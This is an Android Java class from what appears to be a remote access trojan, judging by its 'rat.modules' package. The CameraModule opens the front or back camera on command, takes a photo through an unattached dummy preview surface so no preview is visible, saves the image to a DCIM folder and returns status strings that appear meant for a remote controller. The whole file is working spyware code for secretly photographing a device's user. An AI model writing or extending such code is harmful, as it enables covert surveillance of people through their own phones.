package com.fly0rakoon.rat.modules;

import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.hardware.Camera;
import android.os.Environment;
import android.util.Log;
import android.view.SurfaceHolder;
import android.view.SurfaceView;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

@SuppressWarnings("deprecation")
public class CameraModule {
    
    private static final String TAG = "CameraModule";
    private Context context;
    private Camera camera;
    private int cameraId = 0;
    
    public CameraModule(Context context) {
        this.context = context;
    }
    
    public String takePhoto(String cameraType) {
        // Determine which camera to use
        if (cameraType.equals("front")) {
            cameraId = findFrontCamera();
        } else {
            cameraId = findBackCamera();
        }
        
        if (cameraId == -1) {
            return "ERROR: No camera found";
        }
        
        try {
            // Open the camera
            camera = Camera.open(cameraId);
            
            // Set camera parameters
            Camera.Parameters parameters = camera.getParameters();
            parameters.setFocusMode(Camera.Parameters.FOCUS_MODE_AUTO);
            camera.setParameters(parameters);
            
            // Start preview (required for taking photos)
            SurfaceView dummyView = new SurfaceView(context);
            SurfaceHolder holder = dummyView.getHolder();
            camera.setPreviewDisplay(holder);
            camera.startPreview();
            
            // Take photo
            camera.takePicture(null, null, new Camera.PictureCallback() {
                @Override
                public void onPictureTaken(byte[] data, Camera camera) {
                    savePhoto(data);
                    camera.stopPreview();
                    camera.release();
                }
            });
            
            return "OK: Photo taken";
            
        } catch (Exception e) {
            Log.e(TAG, "Error taking photo: " + e.getMessage());
            releaseCamera();
            return "ERROR: " + e.getMessage();
        }
    }
    
    private int findFrontCamera() {
        int cameraCount = Camera.getNumberOfCameras();
        Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
        
        for (int i = 0; i < cameraCount; i++) {
            Camera.getCameraInfo(i, cameraInfo);
            if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
                return i;
            }
        }
        return -1;
    }
    
    private int findBackCamera() {
        int cameraCount = Camera.getNumberOfCameras();
        Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
        
        for (int i = 0; i < cameraCount; i++) {
            Camera.getCameraInfo(i, cameraInfo);
            if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_BACK) {
                return i;
            }
        }
        return -1;
    }
    
    private void savePhoto(byte[] data) {
        try {
            // Create directory
            File storageDir = new File(
                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM),
                "Fly0Rakoon"
            );
            if (!storageDir.exists()) {
                storageDir.mkdirs();
            }
            
            // Create filename with timestamp
            String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
            String fileName = "IMG_" + timeStamp + ".jpg";
            
            // Save the photo
            File photoFile = new File(storageDir, fileName);
            FileOutputStream fos = new FileOutputStream(photoFile);
            fos.write(data);
            fos.close();
            
            Log.d(TAG, "Photo saved: " + photoFile.getAbsolutePath());
            
            // Make it visible in gallery
            Intent mediaScanIntent = new Intent(Intent.ACTION_MEDIA_SCANNER_SCAN_FILE);
            mediaScanIntent.setData(android.net.Uri.fromFile(photoFile));
            context.sendBroadcast(mediaScanIntent);
            
        } catch (IOException e) {
            Log.e(TAG, "Error saving photo: " + e.getMessage());
        }
    }
    
    private void releaseCamera() {
        if (camera != null) {
            camera.stopPreview();
            camera.release();
            camera = null;
        }
    }
}